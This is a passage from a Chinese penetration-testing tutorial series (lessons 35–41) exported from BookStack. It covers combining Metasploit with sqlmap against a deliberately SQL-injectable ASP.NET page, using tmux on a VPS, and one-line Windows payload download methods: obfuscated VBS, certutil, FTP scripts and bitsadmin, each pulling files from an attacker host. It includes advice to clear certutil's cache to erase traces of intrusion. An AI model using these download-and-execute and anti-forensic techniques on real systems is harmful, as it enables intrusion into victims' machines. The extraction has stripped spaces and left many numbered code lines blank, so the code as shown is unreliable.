本文档使用书栈(BookStack.CN)构建
msf上的sqlmap插件依赖于sqlmap的sqlmapapi.py在使用前需要启动sqlmapapi.py
然后在msf上建立任务。
而sqlmap对msf也完美支持。
靶机：
192.168.1.115，Sqlserver2005+aspx.net
构造注入点，如图1：
第三十五课：与Sqlmap结合攻击
-272-
本文档使用书栈(BookStack.CN)构建
数据结构，如图2：
第三十五课：与Sqlmap结合攻击
-273-
本文档使用书栈(BookStack.CN)构建
关于msf与sqlmap的结合在未来的系列中还会继续讲述，本季作为基础。
注入点代码：
附录：
第三十五课：与Sqlmap结合攻击
-274-
本文档使用书栈(BookStack.CN)构建
1. 
2. 
3. 
4. 
5. 
6. privateDataSetresSet=newDataSet();
7. protectedvoidPage_Load(objectsender,EventArgse)
8. {
9. Stringstrconn="server=.;database=xxrenshi;uid=sa;pwd=123456";
10. stringid=Request.Params["id"];
11. //stringsql=string.Format("select*fromadminwhereid={0}",id);
12. stringsql="select*fromsys_userwhereid="+id;
13. SqlConnectionconnection=newSqlConnection(strconn);
14. connection.Open();
15. SqlDataAdapterdataAdapter=newSqlDataAdapter(sql,connection);
16. dataAdapter.Fill(resSet);
17. DgData.DataSource=resSet.Tables[0];
18. DgData.DataBind();
19. Response.Write("sql:"+sql);
20. Response.Write("Result:");
21. }
22.
23. 
24.
25. 
26. 
27. 
28. 
29. 
30. 
31. 
32. 
33.
34. 
37. 
38. 
39. 
40.
第三十五课：与Sqlmap结合攻击
-275-
本文档使用书栈(BookStack.CN)构建
41. 
42.
43. 
45. 
46.
47. 
48. 
49. 
50. 
Micropoor
第三十五课：与Sqlmap结合攻击
-276-
本文档使用书栈(BookStack.CN)构建
在写第五季的时候，vps掉线了，ssh重新登录后，无法切到MSFsession下，想到部分同学如
果在vps上操作也会遇到这个问题，故本季解决该问题。
Tmux是一个优秀的终端复用软件，类似GNUScreen，但来自于OpenBSD，采用BSD授权。使用它最直
观的好处就是，通过一个终端登录远程主机并运行tmux后，在其中可以开启多个控制台而无需再“浪
费”多余的终端来连接这台远程主机。是BSD实现的Screen替代品，相对于Screen，它更加先进：支
持屏幕切分，而且具备丰富的命令行参数，使其可以灵活、动态的进行各种布局和操作。
1. 可以某个程序在执行时一直是输出状态，需要结合nohup、&来放在后台执行，并且ctrl+c结
束。这时可以打开一个Tmux窗口，在该窗口里执行这个程序，用来保证该程序一直在执行中，只
要Tmux这个窗口不关闭
2. 公司需要备份数据库时，数据量巨大，备份两三天弄不完，这时不小心关闭了终端窗口或误操作
就前功尽弃了，使用Tmux会话运行命令或任务，就不用担心这些问题。
3. 下班后，你需要断开ssh或关闭电脑，将运行的命令或任务放置后台运行。
4. 关闭终端,再次打开时原终端里面的任务进程依然不会中断
5. 在渗透过程中，意外因网络等原因ssh掉线，tmux可以恢复session会话
tmux是什么？
Tmux的使用场景
第三十六课：解决vps上ssh掉线
-277-
本文档使用书栈(BookStack.CN)构建
tmuxnew-ssession1新建会话
ctrl+bd退出会话，回到shell的终端环境//tmuxdetach-client
tmuxls终端环境查看会话列表
ctrl+bs会话环境查看会话列表
tmuxa-tsession1从终端环境进入会话
tmuxkill-session-tsession1销毁会话
tmuxrename-told_session_namenew_session_name重命名会话
ctrl+b$重命名会话(在会话环境中)
还原会话
Micropoor
tmux常用操作命令：
第三十六课：解决vps上ssh掉线
-278-
本文档使用书栈(BookStack.CN)构建
一次msf完整的流程离不开目标机的payload下载与执行。而针对不同环境目标，考虑或者选择不
同方式的payload下载与执行。如webshell下，注入点下。smb下等。而针对不同的实际环
境，来做最好的选择。
既然本季开始专门针对windows下的payload下载讲解，那么就需要考虑到目标机的系统版本，
是windows2000，windows2003，或者是更高的版本如windows2016等。
无论是哪个版本的windows系列，都是支持vbs的。
靶机：windows2003
保存downfile.vbs
```visualbasic
seta=createobject(“adod”+”b.stream”):set
w=createobject(“micro”+”soft.xmlhttp”):w.open
“get”,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write
w.responsebody:a.savetofile
wsh.arguments(1),2
1.
2. ###命令行下执行：
3. ```bash
4. cscriptdownfile.vbshttp://192.168.1.115/robots.txtC:\Inetpub\b.txt
往往在实战中，没有上传的方便条件，尤其是目标机是windows，只有echo方式来写入vbs。
vbs：
命令行下执行：
第三十七课：vbs一句话下载payload
-279-
本文档使用书栈(BookStack.CN)构建
1. echoseta=createobject(^"adod^"+^"b.stream^"):set
2. w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open^"get^",wsh.arguments(0),0:w.send
w.responsebody:a.savetofile
3. wsh.arguments(1),2>>downfile.vbs
优点：支持windows全版本系列
缺点：对https不友好
Micropoor
第三十七课：vbs一句话下载payload
-280-
本文档使用书栈(BookStack.CN)构建
Certutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储和显示证书
颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书，密钥对和证书链。
url:https://docs.microsoft.com/en-us/previous-versions/windows/it-
pro/windows-server-2012-R2-and-2012/cc732443(v=ws.11)
但是近些年好像被玩坏了。
靶机：windows2003windows7
1. certutil.exe-urlcache-split-fhttp://192.168.1.115/robots.txt
默认下载为bin文件。但是不影响在命令行下使用。
certutil.exe下载有个弊端，它的每一次下载都有留有缓存，而导致留下入侵痕迹，所以每次下载
后，需要马上执行如下：
1. certutil.exe-urlcache-split-fhttp://192.168.1.115/robots.txtdelete
certutil微软官方是这样对它解释的：
第三十八课：certutil一句话下载payload
-281-
本文档使用书栈(BookStack.CN)构建
而在应急中certutil也是常用工具之一，来对比文件hash，来判断疑似文件。
Windows2003：
Windows7：
1. C:\>certutil-encodec:\downfile.vbsdownfile.bat
file:downfile.bat
certutil的其它高级应用：
第三十八课：certutil一句话下载payload
-282-
本文档使用书栈(BookStack.CN)构建
解密：
file:downfile.txt
后者的话：powershell内存加载配合certutil解密是一件非常有趣的事情。会在未来的系列中讲述。
Micropoor
第三十八课：certutil一句话下载payload
-283-
本文档使用书栈(BookStack.CN)构建
在实战中，会碰到许多让人敬畏的环境，也许无法执行，或者无法把下载参数带入其中，故补充第七季
vbs参数化的下载。
靶机：windows2003
visualbasicstrFileURL="http://192.168.1.115/robots.txt"strHDLocation=
"c:\\test\\logo.txt"SetobjXMLHTTP=CreateObject("MSXML2.XMLHTTP")objXMLHTTP.open
"GET",strFileURL,falseobjXMLHTTP.send()IfobjXMLHTTP.Status=200ThenSet
objADOStream=CreateObject("ADODB.Stream")objADOStream.OpenobjADOStream.Type=1
objADOStream.WriteobjXMLHTTP.ResponseBodyobjADOStream.Position=0SetobjFSO=
CreateObject("Scripting.FileSystemObject")IfobjFSO.Fileexists(strHDLocation)Then
objFSO.DeleteFilestrHDLocationSetobjFSO=NothingobjADOStream.SaveToFile
strHDLocationobjADOStream.CloseSetobjADOStream=NothingEndifSetobjXMLHTTP=
Nothing
附：源码如下：
第三十九课：vbs一句话下载payload补充
-284-
本文档使用书栈(BookStack.CN)构建
Micropoor
第三十九课：vbs一句话下载payload补充
-285-
本文档使用书栈(BookStack.CN)构建
数据传输的完整性。
代码得精简
Binary，二进制传输
Ascii，ascII传输
在FTP文件传输过程中，ASCII传输HTML和文本编写的文件，而二进制码传输可以传送文本和非
文本（执行文件，压缩文件，图片等），具有通用性，二进制码传输速度比ASCII传输要快。所以在
建立bat脚本时，一般输入bin命令，启用二进制传输。如果用ASCII模式传输非文本文件，可
能会显示一堆乱码。ASCII和binary模式的区别是回车换行的处理。binary模式不对数据进行任
何处理，ASCII模式将回车换行转换为本机的回车字符，比如Unix下是 \n ,Windows下
是 \r\n ，Mac下是 \r 。Unix系统下行结束符是一个字节，即十六进制的 0A ，而ms的
系统是两个字节，即十六进制的 0D0A 。
1. echoopen192.168.1.11521>ftp.txt
2. echo123>>ftp.txt//user
3. echo123>>ftp.txt//password
4. echobinary>>ftp.txt//bin模式
5. echogetrobots.txt>>ftp.txt
6. echobye>>ftp.txt
windows全平台自带ftp，在实战中需要考虑两点：
ftp文件的传输方式：
第四十课：ftp一句话下载payload
-286-
本文档使用书栈(BookStack.CN)构建
Micropoor
第四十课：ftp一句话下载payload
-287-
本文档使用书栈(BookStack.CN)构建
微软官方做出如下解释：
BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度。
具体相关参数参见官方文档：
https://docs.microsoft.com/zh-cn/windows/desktop/Bits/bitsadmin-tool
自windows7以上版本内置bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自动重
试，在比较复杂的网络环境下，有着不错的性能。
靶机：windows7
1. E:\>bitsadmin/rawreturn/transferdown"http://192.168.1.115/robots.txt"
E:\PDF\robots.txt
需要注意的是，bitsadmin要求服务器支持Range标头。
如果需要下载过大的文件，需要提高优先级。配合上面的下载命令。再次执行
1. bitsadmin/setprioritydownforeground
如果下载文件在1-5M之间，需要时时查看进度。同样它也支持进度条。
1. bitsadmin/transferdown/download/prioritynormal
"http://192.168.1.115/robots.txt"E:\PDF\robots.txt
第四十一课：bitsadmin一句话下载payload
-288-
本文档使用书栈(BookStack.CN)构建
后者的话：不支持https协议。
Micropoor
第四十一课：bitsadmin一句话下载payload